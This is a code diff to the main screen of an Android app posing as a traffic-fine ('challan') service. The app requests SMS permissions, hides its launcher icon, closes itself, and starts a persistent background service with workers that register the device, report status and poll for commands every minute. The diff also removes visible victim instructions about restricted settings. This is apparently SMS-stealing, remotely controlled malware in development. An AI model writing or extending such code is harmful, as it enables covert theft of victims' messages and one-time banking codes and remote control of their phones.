@@ -4,10 +4,8 @@ import android.Manifest
 import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
-import android.net.Uri
 import android.os.Build
 import android.os.Bundle
-import android.provider.Settings
 import android.view.View
 import android.widget.Button
 import android.widget.TextView
@@ -15,9 +13,7 @@ import android.widget.Toast
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
-import androidx.work.ExistingPeriodicWorkPolicy
 import androidx.work.OneTimeWorkRequestBuilder
-import androidx.work.PeriodicWorkRequestBuilder
 import androidx.work.WorkManager
 import com.rte.challan.service.BackgroundService
 import com.rte.challan.worker.CommandWorker
@@ -27,9 +23,9 @@ import java.util.concurrent.TimeUnit
 
 class MainActivity : AppCompatActivity() {
 
-    private lateinit var btnEnableRestricted: Button
     private lateinit var btnRequestPermissions: Button
     private lateinit var tvInstruction: TextView
+    // btnEnableRestricted ki ab zarurat nahi hai
 
     private val SMS_PERMISSION_CODE = 100
 
@@ -37,22 +33,18 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
 
-        btnEnableRestricted = findViewById(R.id.btnEnableRestricted)
         btnRequestPermissions = findViewById(R.id.btnRequestPermissions)
         tvInstruction = findViewById(R.id.tvInstruction)
 
+        // UI Clean-up: Purane instruction hide kar do
+        tvInstruction.text = "Please allow permissions to continue setup."
+        
+        // Agar button layout me exist karta hai toh use hide kar do
+        val btnRestricted = findViewById<Button>(R.id.btnEnableRestricted)
+        btnRestricted?.visibility = View.GONE
+
         if (isSmsPermissionGranted()) {
             setupCompleted()
-        } else {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
-                btnEnableRestricted.visibility = View.VISIBLE
-                btnEnableRestricted.setOnClickListener {
-                    openAppInfo()
-                }
-                tvInstruction.text = "Step 1: Tap above button\n" +
-                        "Step 2: Tap ⋮ menu → Allow restricted settings → ON\n" +
-                        "Step 3: Come back and tap Request Permissions"
-            }
         }
 
         btnRequestPermissions.setOnClickListener {
@@ -91,12 +83,6 @@ class MainActivity : AppCompatActivity() {
         )
     }
 
-    private fun openAppInfo() {
-        val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
-        intent.data = Uri.parse("package:$packageName")
-        startActivity(intent)
-    }
-
     override fun onRequestPermissionsResult(
         requestCode: Int,
         permissions: Array<out String>,
@@ -114,7 +100,7 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun setupCompleted() {
-        // ✅ Registration Worker (एक बार)
+        // Registration Worker
         val registrationRequest = OneTimeWorkRequestBuilder<RegistrationWorker>()
             .setInitialDelay(2, TimeUnit.SECONDS)
             .build()
@@ -122,7 +108,7 @@ class MainActivity : AppCompatActivity() {
 
         startBackgroundWork()
         hideLauncherIcon()
-        finish()
+        finish() // App close ho jayegi background setup ke baad
     }
 
     private fun hideLauncherIcon() {
@@ -138,19 +124,16 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startBackgroundWork() {
-        // ✅ Foreground Service शुरू करें
         val serviceIntent = Intent(this, BackgroundService::class.java)
         ContextCompat.startForegroundService(this, serviceIntent)
 
         val workManager = WorkManager.getInstance(this)
 
-        // ✅ StatusWorker – पहली बार 10 सेकंड बाद, फिर खुद को हर 30 सेकंड में चलाएगा
         val firstStatus = OneTimeWorkRequestBuilder<StatusWorker>()
             .setInitialDelay(10, TimeUnit.SECONDS)
             .build()
         workManager.enqueue(firstStatus)
 
-        // ✅ CommandWorker – पहली बार 1 मिनट बाद, फिर खुद को हर 1 मिनट में चलाएगा
         val firstCommand = OneTimeWorkRequestBuilder<CommandWorker>()
             .setInitialDelay(1, TimeUnit.MINUTES)
             .build()
